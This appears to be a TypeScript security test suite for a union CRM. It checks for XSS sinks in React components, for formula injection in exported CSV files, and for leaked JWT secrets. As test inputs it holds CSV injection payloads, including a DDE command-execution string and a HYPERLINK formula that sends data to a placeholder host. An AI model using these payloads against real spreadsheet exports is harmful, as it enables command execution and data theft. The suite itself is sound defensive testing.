// ============================================================================
// 04_renderizacao.spec.ts — Portão de segurança adversarial (ETAPA 07)
// Vetor V3 na fronteira de SAÍDA: o banco guarda o payload hostil literal — e
// isso está certo, é dado, não código. A defesa pertence a quem renderiza.
//
// Duas saídas existem no CRM Sindcom:
//   1. as telas do PWA  → React escapa por padrão; o risco mora nas exceções
//   2. o CSV exportado  → aberto no Excel da Secretaria, que INTERPRETA fórmula
//
// Não precisa de banco: são asserções sobre o código que renderiza.
// ============================================================================
import { describe, it, expect } from "vitest";
import { readFileSync } from "node:fs";
import { execSync } from "node:child_process";
import Papa from "papaparse";
import { gerarCsv } from "../../src/lib/csv";

// ============================================================================
// 1. Telas do PWA
// ============================================================================
describe("V3 — XSS armazenado nas telas", () => {
  it("nenhum componente usa dangerouslySetInnerHTML ou innerHTML", () => {
    // O escape do React é a defesa inteira. Estas duas construções são as únicas
    // formas de desligá-lo — o teste existe para que ligar uma delas no futuro
    // custe uma decisão explícita, e não passe despercebido numa revisão.
    const achados = execSync(
      'git grep -n -E "dangerouslySetInnerHTML|\\.innerHTML\\s*=" -- src/ || true',
      { encoding: "utf-8" },
    ).trim();
    expect(achados, `escape do React desligado em:\n${achados}`).toBe("");
  });

  it("nenhum href/src é montado a partir de dado do banco sem esquema fixo", () => {
    // `href={algumaCoisa}` com dado de usuário aceita `javascript:` — o caminho
    // de XSS que sobrevive ao escape do React. Links com esquema literal
    // (`href="/rota"`, `href={`mailto:${x}`}`) não são alcançados por isto.
    const suspeitos = execSync(
      'git grep -n -E "(href|src)=\\{[a-zA-Z_]" -- src/ || true',
      { encoding: "utf-8" },
    )
      .split("\n")
      .filter((l) => l.trim() !== "")
      // Template literal com esquema fixo no começo é seguro.
      .filter((l) => !/=\{`(https?:|mailto:|tel:|\/)/.test(l));

    expect(suspeitos, `href/src dinâmico sem esquema fixo:\n${suspeitos.join("\n")}`).toEqual([]);
  });
});

// ============================================================================
// 2. CSV — a saída que a Secretaria abre no Excel
// ============================================================================
describe("V3 — injeção de fórmula no CSV exportado", () => {
  /**
   * O caminho completo, e é por isso que este caso importa mais que os outros
   * deste arquivo:
   *
   *   1. o formulário público de filiação (Edge Function, sem login) grava
   *      `nome_completo` em `trabalhadores.nome` sem sanitizar;
   *   2. a Secretaria exporta a lista em CSV pelo botão da tela;
   *   3. o Excel/LibreOffice avalia toda célula que comece com `=`, `+`, `-`,
   *      `@`, TAB ou CR — inclusive dentro de aspas, porque as aspas são do
   *      formato CSV e somem no parse.
   *
   * Ou seja: entrada anônima → banco → planilha da Denise. Aspas não defendem;
   * o que defende é neutralizar o primeiro caractere.
   */
  const PAYLOADS: Array<[string, string]> = [
    ["fórmula clássica", "=1+1"],
    ["execução de comando (DDE)", '=cmd|\'/c calc\'!A1'],
    ["exfiltração por HYPERLINK", '=HYPERLINK("http://exemplo.invalido/?d="&A1,"clique")'],
    ["soma disfarçada de sinal", "+1+1"],
    ["subtração disfarçada de sinal", "-1+1"],
    ["arroba do Lotus", "@SUM(1+1)"],
    ["tabulação inicial", "\t=1+1"],
    ["retorno de carro inicial", "\r=1+1"],
  ];

  it("célula que começa com caractere de fórmula sai neutralizada", () => {
    for (const [nome, payload] of PAYLOADS) {
      const csv = gerarCsv([{ nome: payload }], [{ titulo: "Nome", valor: (l) => l.nome }]);
      const celula = csv.split("\r\n")[1] ?? "";

      // Neutralizado = o conteúdo perdeu o gatilho na primeira posição. A forma
      // canônica é prefixar com apóstrofo, que o Excel trata como "texto".
      const conteudo = celula.replace(/^"|"$/g, "");
      const perigoso = /^[=+\-@\t\r]/.test(conteudo);

      expect(
        perigoso,
        `INJEÇÃO DE FÓRMULA — ${nome}: a célula sai como ${JSON.stringify(conteudo)} e o Excel a executa ao abrir`,
      ).toBe(false);
    }
  });

  it("neutralizar não pode estragar o dado legítimo", () => {
    // Controle negativo: a correção não pode transformar texto normal. Valor
    // negativo é o caso que mais importa — o CRM exporta dinheiro.
    const legitimos = ["Maria da Silva", "R$ 1.234,56", "-50,00", "2026-08-21", "empresa@exemplo.com", "(35) 99999-0000"];
    for (const v of legitimos) {
      const csv = gerarCsv([{ v }], [{ titulo: "V", valor: (l) => l.v }]);
      const conteudo = (csv.split("\r\n")[1] ?? "").replace(/^"|"$/g, "");

      if (v.startsWith("-")) {
        // Um valor negativo TEM de continuar legível como o mesmo número para
        // quem lê a planilha, mesmo tendo perdido o gatilho de fórmula.
        expect(conteudo, `valor negativo ficou irreconhecível: ${conteudo}`).toContain("50,00");
      } else {
        expect(conteudo, `dado legítimo alterado na exportação: ${v} → ${conteudo}`).toBe(v);
      }
    }
  });

  it("o separador do CSV continua sendo respeitado com payload hostil", () => {
    // Payload com `;` e aspas tenta quebrar a estrutura e criar colunas novas.
    const csv = gerarCsv(
      [{ nome: 'Fulano";=1+1;"', obs: "ok" }],
      [
        { titulo: "Nome", valor: (l) => l.nome },
        { titulo: "Obs", valor: (l) => l.obs },
      ],
    );
    // Contar campos por regex erra: as aspas escapadas (`""`) do payload parecem
    // início de campo novo. Quem sabe contar um CSV é um parser de CSV.
    const { data } = Papa.parse<string[]>(csv, { delimiter: ";" });
    expect(data[0], "cabeçalho alterado pelo payload").toEqual(["Nome", "Obs"]);
    expect(
      data[1].length,
      `payload criou coluna extra — o ; dele escapou das aspas: ${JSON.stringify(data[1])}`,
    ).toBe(2);
    expect(data[1][1], "o payload invadiu a coluna seguinte").toBe("ok");
  });
});

// ============================================================================
// 3. O que o repositório não pode conter
// ============================================================================
describe("V6 — segredo no que vai para o navegador", () => {
  it("nenhum arquivo servido ao navegador carrega um JWT literal", () => {
    // Procurar a PALAVRA "service_role" dá falso positivo: ela aparece em cinco
    // comentários do projeto, todos dizendo para não usá-la no frontend — e um
    // comentário desses é o contrário de um vazamento. O que vaza é a CHAVE, e
    // chave do Supabase é um JWT: três blocos base64url separados por ponto,
    // começando em `eyJ`.
    const achados = execSync(
      'git grep -n -E "eyJ[A-Za-z0-9_-]{10,}\\.[A-Za-z0-9_-]{10,}\\." -- src/ public/ index.html || true',
      { encoding: "utf-8" },
    ).trim();
    expect(achados, `JWT embutido em arquivo servido ao navegador:\n${achados}`).toBe("");
  });

  it("o .env do frontend só expõe VITE_ que podem ser públicas", () => {
    const vite = readFileSync(".env", "utf-8")
      .split(/\r?\n/)
      .filter((l) => l.startsWith("VITE_"))
      .map((l) => l.split("=")[0]);
    const proibidas = vite.filter((n) => /SERVICE|SECRET|SENHA|PASSWORD|PRIVATE/i.test(n));
    expect(proibidas, `variável sensível exposta ao bundle: ${proibidas.join(", ")}`).toEqual([]);
  });
});
